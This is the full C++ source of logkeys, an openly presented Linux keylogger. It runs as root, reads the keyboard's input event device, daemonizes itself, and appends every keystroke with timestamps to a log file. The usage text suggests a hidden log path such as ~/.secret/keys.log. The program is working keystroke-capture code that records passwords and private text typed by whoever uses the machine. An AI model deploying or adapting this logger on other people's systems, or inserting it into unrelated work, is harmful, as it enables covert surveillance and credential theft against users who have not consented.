/*
  Copyleft (ɔ) 2009 Kernc
  This program is free software. It comes with absolutely no warranty whatsoever.
  See COPYING for further information.
  
  Project homepage: http://code.google.com/p/logkeys/
*/

#include <cstdio>
#include <cerrno>
#include <cstring>
#include <sstream>
#include <cstdlib>
#include <csignal>
#include <unistd.h>
#include <getopt.h>
#include <sys/file.h>
#include <linux/input.h>

#ifdef HAVE_CONFIG_H
# include <config.h>  // include config produced from ./configure
#endif

#define DEFAULT_LOG_FILE "/var/log/logkeys.log"
#define TMP_PID_FILE     "/tmp/logkeys.pid.lock"

#ifdef INPUT_EVENT_PREFIX  // may be defined by ./configure --enable-evdev-path=PATH
# define INPUT_EVENT_PATH (INPUT_EVENT_PREFIX "/event")  // in which case use it
#else
# define INPUT_EVENT_PATH "/dev/input/event"  // otherwise use the default; a number is appended at runtime; one accesses keyboard e.g. via /dev/input/event1
#endif//INPUT_EVENT_PREFIX

#ifndef INPUT_EVENT_DEVICE
//# define INPUT_EVENT_DEVICE "/dev/input/event4" // uncomment this if you want your input event device statically defined rather than "calculated" at runtime
// better yet, use ./configure --enable-evdev=DEV to specify INPUT_EVENT_DEVICE !
#endif//INPUT_EVENT_DEVICE

#ifndef PACKAGE_VERSION
# define PACKAGE_VERSION "0.1.0"  // if PACKAGE_VERSION wasn't defined in <config.h>
#endif

void usage() {
  fprintf(stderr,
"Usage: logkeys [OPTION]...\n"
"Log depressed keyboard keys.\n"
"\n"
"  -s, --start               start logging keypresses\n"
"  -m, --keymap=FILE         use keymap FILE\n"
"  -o, --output=FILE         log output to FILE [" DEFAULT_LOG_FILE "]\n"
"  -u, --us-keymap           use en_US keymap instead of configured default\n"
"  -k, --kill                kill running logkeys process\n"
"  -d, --device=FILE         input event device [" INPUT_EVENT_PATH "X]\n"
"  -?, --help                print this help\n"
"      --export-keymap=FILE  export configured keymap to FILE and exit\n"
"      --no-func-keys        don't log function keys, only character keys\n"
"\n"
"Examples: logkeys -s -m mylang.map -o ~/.secret/keys.log\n"
"          logkeys -s -d /dev/input/event6\n"
"          logkeys -k\n"
"\n"
"logkeys version: " PACKAGE_VERSION "\n"
"logkeys homepage: <http://code.google.com/p/logkeys/>\n"
  );
}

// executes cmd and returns string ouput or "ERR" on pipe error
std::string exec(const char* cmd) {
    FILE* pipe = popen(cmd, "r");
    if (!pipe) return "ERR";
    char buffer[128];
    std::string result = "";
    while(!feof(pipe)) {
    	if(fgets(buffer, 128, pipe) != NULL)
    		result += buffer;
    }
    pclose(pipe);
    return result;
}

bool flag_kill = false;  // kill any running logkeys process

void signal_handler(int interrupt) {
  flag_kill = true;
}

// translates character keycodes to continuous array indices
inline int to_char_array_index(int keycode) {
  if (keycode >= KEY_1 && keycode <= KEY_EQUAL)  // keycodes 2-13: US keyboard: 1, 2, ..., 0, -, =
    return keycode - 2;
  if (keycode >= KEY_Q && keycode <= KEY_RIGHTBRACE)  // keycodes 16-27: q, w, ..., [, ]
    return keycode - 4;
  if (keycode >= KEY_A && keycode <= KEY_GRAVE)  // keycodes 30-41: a, s, ..., ', `
    return keycode - 6;
  if (keycode >= KEY_BACKSLASH && keycode <= KEY_SLASH)  // keycodes 43-53: \, z, ..., ., /
    return keycode - 7;
  
  if (keycode == KEY_102ND) return 47;
  
  return -1;  // not character keycode
}

// translates function keys keycodes to continuous array indices
inline int to_func_array_index(int keycode) {
  if (keycode == KEY_ESC)  // 1
    return 0;
  if (keycode >= KEY_BACKSPACE && keycode <= KEY_TAB)  // 14-15
    return keycode - 13;
  if (keycode >= KEY_ENTER && keycode <= KEY_LEFTCTRL)  // 28-29
    return keycode - 25;
  if (keycode == KEY_LEFTSHIFT) return keycode - 37;  // 42
  if (keycode >= KEY_RIGHTSHIFT && keycode <= KEY_KPDOT)  // 54-83
    return keycode - 48;
  if (keycode >= KEY_F11 && keycode <= KEY_F12)  // 87-88
    return keycode - 51;
  if (keycode >= KEY_KPENTER && keycode <= KEY_DELETE)  // 96-111
    return keycode - 58;
  if (keycode == KEY_PAUSE)  // 119
    return keycode - 65;
  if (keycode >= KEY_LEFTMETA && keycode <= KEY_COMPOSE)  // 125-127
    return keycode - 70;
  
  return -1;  // not function key keycode
}

int main(int argc, char **argv) {
  
  char func_keytable[][8] = {
    "<Esc>", "<BckSp>", "<Tab>", "<Enter>", "<LCtrl>", "<LShft>", "<RShft>", "<KP*>", "<LAlt>", " ", "<CpsLk>", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>",
    "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "<NumLk>", "<ScrLk>", "<KP7>", "<KP8>", "<KP9>", "<KP->", "<KP4>", "<KP5>", "<KP6>", "<KP+>", "<KP1>",
    "<KP2>", "<KP3>", "<KP0>", "<KP.>", /*"<",*/ "<F11>", "<F12>", "<KPEnt>", "<RCtrl>", "<KP/>", "<PrtSc>", "<AltGr>", "<Break>" /*linefeed?*/, "<Home>", "<Up>", "<PgUp>", 
    "<Left>", "<Right>", "<End>", "<Down>", "<PgDn>", "<Ins>", "<Del>", "<Pause>", "<LMeta>", "<RMeta>", "<Menu>"
  };
  
  wchar_t char_keytable[49] =  L"1234567890-=qwertyuiop[]asdfghjkl;'`\\zxcvbnm,./<";
  wchar_t shift_keytable[49] = L"!@#$%^&*()_+QWERTYUIOP{}ASDFGHJKL:\"~|ZXCVBNM<>?>";
  wchar_t altgr_keytable[49] = {0}; // old, US don't use AltGr key: L"\0@\0$\0\0{[]}\\\0qwertyuiop\0~asdfghjkl\0\0\0\0zxcvbnm\0\0\0|";  // \0 on no symbol; as obtained by `loadkeys us`
  
  const char char_or_func[] =  // c means character key, f means function key, _ is blank/error (_ used, don't change); all according to KEY_* defines from <linux/input.h>
    "_fccccccccccccff"
    "ccccccccccccffcc"
    "ccccccccccfccccc"
    "ccccccffffffffff"
    "ffffffffffffffff"
    "ffff__cff_______"
    "ffffffffffffffff"
    "_______f_____fff";
  
  if (geteuid()) { fprintf(stderr, "Got r00t?\n"); return EXIT_FAILURE; }
  
  if (argc < 2) { usage(); return EXIT_FAILURE; }
  
  bool flag_start = false;   // start logger
  // bool flag_kill; is defined global for signal_handler to access it
  bool flag_us_keymap = false;  // use default us keymap if dynamic keymap unavailable
  bool flag_keymap = false;  // use keymap specified by keymap_filename
  int flag_export = 0;  // export dynamically created keymap
  int flag_nofunc = 0;  // only log character keys (e.g. 'c', '2', 'O', etc.) and don't log function keys (e.g. <LShift>, etc.)
  
  char *log_filename = (char*) DEFAULT_LOG_FILE;  // default log file
  char log_file_path[512]; // don't use paths longer than 512 B !!
  char *keymap_filename = NULL;  // path to keymap file to be used
  char *device_filename = NULL;  // path to input event device if given with -d switch

  { // process options and arguments
    
    struct option long_options[] = {
      {"start",     no_argument,       0, 's'},
      {"keymap",    required_argument, 0, 'm'},
      {"output",    required_argument, 0, 'o'},
      {"us-keymap", no_argument,       0, 'u'},
      {"kill",      no_argument,       0, 'k'},
      {"device",    required_argument, 0, 'd'},
      {"help",      no_argument,       0, '?'},
#define EXPORT_KEYMAP_INDEX 7
      {"export-keymap", required_argument, &flag_export, 1},  // option_index is 7
      {"no-func-keys",  no_argument,       &flag_nofunc, 1},
      {0, 0, 0, 0}
    };
    
    char c;
    int option_index;
    
    while ((c = getopt_long(argc, argv, "sm:o:ukd:?", long_options, &option_index)) != -1)
      switch (c) {
        case 's': flag_start = true;                            break;
        case 'm': flag_keymap = true; keymap_filename = optarg; break;
        case 'o': log_filename = optarg;                        break;
        case 'u': flag_us_keymap = true;                        break;
        case 'k': flag_kill = true;                             break;
        case 'd': device_filename = optarg;                     break;
        
        case  0 : 
          if (option_index == EXPORT_KEYMAP_INDEX)
            keymap_filename = optarg; 
          break;  // + flag_export or flag_nofunc already set
        
        case '?': usage(); return EXIT_SUCCESS;
        default : usage(); return EXIT_FAILURE;
      }

    while(optind < argc)
      fprintf(stderr, "%s: Non-option argument %s\n", argv[0], argv[optind++]);
  } //\ arguments
  
  // kill existing logkeys process
  if (flag_kill) {
    FILE *temp_file = fopen(TMP_PID_FILE, "r");
    pid_t pid;
    if ((temp_file != NULL && fscanf(temp_file, "%d", &pid) == 1 && fclose(temp_file) == 0) || 
        (sscanf( exec("pgrep logkeys").c_str(), "%d", &pid) == 1 && pid != getpid())) { // if reading PID from temp_file failed, try pgrep pipe
      remove(TMP_PID_FILE);
      kill(pid, SIGINT);
      return EXIT_SUCCESS;
    }
    fprintf(stderr, "%s: No process killed.\n", argv[0]);
    return EXIT_FAILURE;
  } else if (!flag_start && !flag_export) { usage(); return EXIT_FAILURE; }
  
  // check for incompatible flags
  if (flag_keymap && flag_us_keymap) {
    fprintf(stderr, "%s: Incompatible flags '-m' and '-u'", argv[0]);
    usage();
    return EXIT_FAILURE;
  }
  
  // if user provided a relative path to output file :/ stupid user :/
  if (log_filename[0] != '/') {
    if (getcwd(log_file_path, sizeof(log_file_path) - strlen(log_filename) - 2 /* '/' and '\0' */) == NULL) {
      fprintf(stderr, "%s: Error copying CWD: %s%s\n", argv[0], strerror(errno), 
        (errno == ERANGE ? " (CWD path too long, GO FUCK YOURSELF!!)" : ""));
      return EXIT_FAILURE;
    }
    strcat(log_file_path, "/");
    strncat(log_file_path, log_filename, sizeof(log_file_path) - strlen(log_file_path));
    log_filename = log_file_path;
  }
  
  // set locale to common UTF-8 for wchars to be recognized correctly
  if(setlocale(LC_CTYPE, "en_US.UTF-8") == NULL)  // if en_US.UTF-8 isn't available
    setlocale(LC_CTYPE, "");  // try the locale that corresponds to the value of the associated environment variables, LC_CTYPE and LANG
  // else just leave the burden of possible Fail to the user, without any warning :D
  
  // read keymap from file
  if (flag_start && flag_keymap && !flag_export) {
    
    // custom map will be used; erase existing US keymapping
    memset(char_keytable,  '\0', sizeof(char_keytable));
    memset(shift_keytable, '\0', sizeof(shift_keytable));
    memset(altgr_keytable, '\0', sizeof(altgr_keytable));
    
    stdin = freopen(keymap_filename, "r", stdin);
    unsigned int i = 0;
    unsigned int line_number = 0;
    int index;
    char func_string[32];
    char line[32];
    
    while (!feof(stdin)) {
      
      if (i >= sizeof(char_or_func)) break;  // only read up to 128 keycode bindings (currently 105:)
      
      if (char_or_func[i] != '_') {
        if(fgets(line, sizeof(line), stdin));  // wrapped in if() to avoid compiler warning; handle errors later
        ++line_number;
      }
      
      if (char_or_func[i] == 'c') {
        
        index = to_char_array_index(i);
        if (sscanf(line, "%lc %lc %lc\n", &char_keytable[index], &shift_keytable[index], &altgr_keytable[index]) < 2) {
          fprintf(stderr, "%s: Error parsing keymap '%s' on line %d: %s\n", argv[0], keymap_filename, line_number, line);
          return EXIT_FAILURE;
        }
      }
      if (char_or_func[i] == 'f') {

        if (i != KEY_SPACE) {  // space causes empty string and trouble
          if (sscanf(line, "%s\n", &func_string[0]) != 1 || strlen(func_string) > 7) {
            fprintf(stderr, "%s: Error parsing keymap '%s' on line %d: %s\n", argv[0], keymap_filename, line_number, line);
            return EXIT_FAILURE;
          }
          strcpy(func_keytable[to_func_array_index(i)], func_string);
        }
      }
      ++i;
    } //\ while (!feof(stdin))
    fclose(stdin);
  
  // get keymap used by the system and optionally export it to file
  } else if ((flag_start && !flag_us_keymap) || flag_export) {
    
    // custom map will be used; erase existing US keymapping
    memset(char_keytable,  '\0', sizeof(char_keytable));
    memset(shift_keytable, '\0', sizeof(shift_keytable));
    memset(altgr_keytable, '\0', sizeof(altgr_keytable));
    
    // get keymap from dumpkeys
    // if one knows of a better, more portable way to get wchar_t-s from symbolic keysym-s from `dumpkeys` or `xmodmap` or another, PLEASE LET ME KNOW! kthx
    std::stringstream ss, dump(exec("dumpkeys -n | grep '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'"));  // see example output after i.e. `loadkeys slovene`
    // above was "dumpkeys -n | grep -P '^keycode|^\tshift\tkeycode|^\taltgr\tkeycode'", but grep is more portable without -P switch
    std::string line;

    unsigned int keycode = 0;   // keycode
    int index;
    int utf8code;      // utf-8 code of keysym answering keycode
    
    while (std::getline(dump, line)) {
      ss.clear();
      ss.str("");
      utf8code = 0;
      
      // replace any U+#### with 0x#### for easier parsing
      index = line.find("U+", 0);
      while (static_cast<std::string::size_type>(index) != std::string::npos) {
        line[index] = '0'; line[index + 1] = 'x';
        index = line.find("U+", index);
      }
      
      // if line starts with 'keycode'
      if (line[0] == 'k') {
        ++keycode;
        
        if (keycode >= sizeof(char_or_func)) break;  // only ever map keycodes up to 128
        
        if (char_or_func[keycode] == 'c') {
          
          index = to_char_array_index(keycode);  // only map character keys of keyboard
          
          ss << &line[14];  // 1st keysym starts at index 14 (skip "keycode XXX = ")
          ss >> std::hex >> utf8code;
          // 0XB00CLUELESS: 0xb00 is added to some keysyms that are preceeded with '+'; i don't really know why; see `man keymaps`; `man loadkeys` says numeric keysym values aren't to be relied on, orly?
          if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00; 
          char_keytable[index] = static_cast<wchar_t>(utf8code);
          
          // if there is a second keysym column, assume it is a shift column
          if (ss >> std::hex >> utf8code) {
            if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
            shift_keytable[index] = static_cast<wchar_t>(utf8code);
          }
          
          // if there is a third keysym column, assume it is an altgr column
          if (ss >> std::hex >> utf8code) {
            if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
            //utf8code = utf8code & 0xFF00 ? 0 : utf8code;  // commented: just use w/e value we get
            altgr_keytable[index] = static_cast<wchar_t>(utf8code);
          }
        } //\ if (char_or_func[keycode] == 'c')
        continue;
      } //\ if (line[0] == 'k')
      
      index = to_char_array_index(keycode);
      
      // if line starts with 'shift keycode'
      if (char_or_func[keycode] == 'c' && line[1] == 's') {
        ss << &line[21];  // 1st keysym starts at index 21 (skip "\tshift\tkeycode XXX = ")
        ss >> std::hex >> utf8code;
        if (line[21] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;  // see line 0XB00CLUELESS
        shift_keytable[index] = static_cast<wchar_t>(utf8code);
      }
      
      // if line starts with 'altgr keycode'
      if (char_or_func[keycode] == 'c' && line[1] == 'a') {
        ss << &line[21];  // 1st keysym starts at index 21 (skip "\taltgr\tkeycode XXX = ")
        ss >> std::hex >> utf8code;
        if (line[21] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;  // see line 0XB00CLUELESS
        //utf8code = utf8code & 0xFF00 ? 0 : utf8code;  // commented: just use w/e value we get
        altgr_keytable[index] = static_cast<wchar_t>(utf8code);
      }
      
    } //\ while (getline(dump, line))
    
    // export keymap to file as requested
    if (flag_export) {
      stdout = freopen(keymap_filename, "w", stdout);
      if (stdout == NULL) {
        fprintf(stderr, "%s: Error opening keymap output file '%s': %s\n", argv[0], keymap_filename, strerror(errno));
        return EXIT_FAILURE;
      }
      
      for (unsigned int i = 0; i < sizeof(char_or_func); ++i) {
        if (char_or_func[i] == 'c') {
          index = to_char_array_index(i);
          fprintf(stdout, "%lc %lc", char_keytable[index], shift_keytable[index]);
          if (altgr_keytable[index] != L'\0')
            fprintf(stdout, " %lc\n", altgr_keytable[index]);
          else fprintf(stdout, "\n");
        } else if (char_or_func[i] == 'f') {
          fprintf(stdout, "%s\n", func_keytable[to_func_array_index(i)]);
        }
      }
      fprintf(stderr, "%s: Written keymap to file '%s'\n", argv[0], keymap_filename);
      fclose(stdout);
      return EXIT_SUCCESS;
    } //\ if (flag_export)
  }
  
#ifndef INPUT_EVENT_DEVICE  // sometimes X in /dev/input/eventX is different from one reboot to another, in that case, determine it dynamically
  
  char *INPUT_EVENT_DEVICE;
  
  if (device_filename == NULL) {  // no device given with -d switch
    // extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
    std::string output = exec("grep Name /proc/bus/input/devices | grep -nE '[Kk]eyboard|kbd'");
    if (output == "ERR") { // if pipe errors, exit
      fprintf(stderr, "%s: Cannot determine keyboard input event device: %s\n", argv[0], strerror(errno));
      return EXIT_FAILURE;
    }
    
    // the correct input event # is (output - 1)
    std::stringstream input_fd_filename;
    input_fd_filename << INPUT_EVENT_PATH;
    input_fd_filename << (atoi(output.c_str()) - 1);
    
    INPUT_EVENT_DEVICE = (char*)input_fd_filename.str().c_str();
    
  } else INPUT_EVENT_DEVICE = device_filename;  // event device supplied as -d argument

#endif//INPUT_EVENT_DEVICE
  
  { // catch SIGHUP, SIGINT and SIGTERM signals to exit gracefully
    
    struct sigaction act = {};
    act.sa_handler = signal_handler;
    sigaction(SIGHUP,  &act, NULL);
    sigaction(SIGINT,  &act, NULL);
    sigaction(SIGTERM, &act, NULL);
  } //\ signals
  
  { // everything went well up to now, let's become daemon
    
    switch (fork()) {
      case 0: break;  // child continues
      case -1:  // error
        fprintf(stderr, "%s: Error creating child process: %s\n", argv[0], strerror(errno));
        return EXIT_FAILURE;
      default: return EXIT_SUCCESS;  // parent exits
    }
    setsid();
    if(chdir("/"));  // wrapped in if() to avoid compiler warning
    switch (fork()) {
      case 0: break; // second child continues
      case -1: 
        fprintf(stderr, "%s: Error creating second child process: %s\n", argv[0], strerror(errno));
        return EXIT_FAILURE;
      default: return EXIT_SUCCESS;  // parent exits
    }
    close(0);  // drop stdin
  } //\ daemon
  
  // create temp file carrying PID for later retrieval
  int temp_fd;
  if ((temp_fd = open(TMP_PID_FILE, O_WRONLY | O_CREAT, 0600)) == -1) {
    fprintf(stderr, "%s: Error opening temporary file '" TMP_PID_FILE "': %s\n", argv[0], strerror(errno));
    return EXIT_FAILURE;
  }
  if (flock(temp_fd, LOCK_EX | LOCK_NB) == 0) {  // this is the first process to request temp file, now block all others
    if (flock(temp_fd, LOCK_SH | LOCK_NB) == -1) {
      fprintf(stderr, "%s: Error obtaining lock on temporary file '" TMP_PID_FILE "': %s\n", argv[0], strerror(errno));
      return EXIT_FAILURE;
    }
    char pid_str[16] = {0};
    sprintf(pid_str, "%d", getpid());
    if (write(temp_fd, pid_str, strlen(pid_str)) == -1) {
      fprintf(stderr, "%s: Error writing to temporary file '" TMP_PID_FILE "': %s\n", argv[0], strerror(errno));
    }
  } else {  // another logkeys process is already running, therefore terminate this one
    fprintf(stderr, "%s: Another process already running. Quitting.\n", argv[0]);
    return EXIT_FAILURE;
  } //\ temp file
  
  // open input device for reading
  int input_fd = open(INPUT_EVENT_DEVICE, O_RDONLY | O_NONBLOCK);
  if (input_fd == -1) {
    fprintf(stderr, "%s: Error opening input event device '%s': %s\n", argv[0], INPUT_EVENT_DEVICE, strerror(errno));
    return EXIT_FAILURE;
  }
  
  // open log file as stdout (if file doesn't exist, create it with safe 0600 permissions)
  umask(0177);
  stdout = freopen(log_filename, "a", stdout);
  if (stdout == NULL) {
    fprintf(stderr, "%s: Error opening output file '%s': %s\n", argv[0], log_filename, strerror(errno));
    return EXIT_FAILURE;
  }
  
  // we've got everything we need, now drop privileges by becoming 'nobody'
  setgid(65534); setuid(65534);
  
  unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
  struct input_event event;
  char timestamp[32];  // timestamp string, long enough to hold "\n%F %T%z > "
  char repeat[16];  // holds "key repeated" string of the format "<x%d>"
  bool shift_in_effect = false;
  bool altgr_in_effect = false;
  bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
  int count_repeats = 0;  // count_repeats differs from the actual number of repeated characters!! only OS knows how these two values are related (by respecting configured repeat speed and delay)

  time_t cur_time;
  time(&cur_time);
  strftime(timestamp, sizeof(timestamp), "\n%F %T%z > ", localtime(&cur_time));
  
  fprintf(stdout, "Logging started ...\n%s", timestamp);
  fflush(stdout);

  while (true) {  // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM

    if (flag_kill) break;  // if process received kill signal, end it

// these event.value-s aren't defined in <linux/input.h> ?
#define EV_MAKE   1  // when key pressed
#define EV_BREAK  0  // when key released
#define EV_REPEAT 2  // when key switches to repeating after short delay
    
    while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
      
      if (event.type == EV_KEY) {  // keyboard events always of type EV_KEY
        
        scan_code = event.code;
        
        if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
          fprintf(stdout, "<E-%x>", scan_code);
          continue;
        }
        
        // on key repeat ; must be before on key press
        if (event.value == EV_REPEAT) {
          ++count_repeats;
        } else if (count_repeats) {
          if (prev_code == KEY_RIGHTSHIFT || prev_code == KEY_LEFTCTRL || 
              prev_code == KEY_RIGHTALT   || prev_code == KEY_LEFTALT  || 
              prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // do nothing if the cause of repetition are these function keys
          else {
            if (flag_nofunc && char_or_func[prev_code] == 'f');  // if repeated was function key, and if we don't log function keys, then don't log repeat either
            else {
              sprintf(repeat, "<#+%d>", count_repeats);  // else print some dubious note of repetition
              fprintf(stdout, "%s", repeat);
            }
          }
          count_repeats = 0;
        }
        
        // on key press
        if (event.value == EV_MAKE) {
          
          // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
          if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
              (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
            strftime(timestamp, sizeof(timestamp), "\n%F %T%z > ", localtime(&event.time.tv_sec));
            if (ctrl_in_effect)
              fprintf(stdout, "%lc", char_keytable[to_char_array_index(scan_code)]);  // log C or D
            fprintf (stdout, "%s", timestamp);  // then newline and timestamp
            continue;  // but don't log "<Enter>"
          }
          
          if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
            shift_in_effect = true;
          
          if (scan_code == KEY_RIGHTALT)
            altgr_in_effect = true;
          
          if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
            ctrl_in_effect = true;
          
          // print character or string responding to received keycode
          if (char_or_func[scan_code] == 'c') {
            if (altgr_in_effect) {
              wchar_t wch = altgr_keytable[to_char_array_index(scan_code)];
              if (wch != L'\0') fprintf(stdout, "%lc", wch);
              else if (shift_in_effect)
                fprintf(stdout, "%lc", shift_keytable[to_char_array_index(scan_code)]);
              else
                fprintf(stdout, "%lc", char_keytable[to_char_array_index(scan_code)]);
            } else if (shift_in_effect)
              fprintf(stdout, "%lc", shift_keytable[to_char_array_index(scan_code)]);
            else
              fprintf(stdout, "%lc", char_keytable[to_char_array_index(scan_code)]);
          } else if (char_or_func[scan_code] == 'f') {
            if (!flag_nofunc) {  // don't log function keys if --no-func-keys requested
              fprintf(stdout, "%s", func_keytable[to_func_array_index(scan_code)]);
            } else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
              // but always log a single space for Space and Tab keys
              fprintf(stdout, " ");
            }
          } else fprintf(stdout, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
          
        }
        
        // on key release
        if (event.value == EV_BREAK) {
          if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
            shift_in_effect = false;
          if (scan_code == KEY_RIGHTALT)
            altgr_in_effect = false;
          if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
            ctrl_in_effect = false;
        }
        
        prev_code = scan_code;
      }
    }
    
    fflush(stdout);
    
    sleep(1);
  } //\ while (true)
  
  // append final timestamp, close files and exit
  time(&cur_time);
  strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
  fprintf(stdout, "\n\nLogging stopped at %s\n\n", timestamp);
  
  fclose(stdout);
  close(input_fd);
  close(temp_fd);
  
  remove(TMP_PID_FILE);
  
  return EXIT_SUCCESS;
}
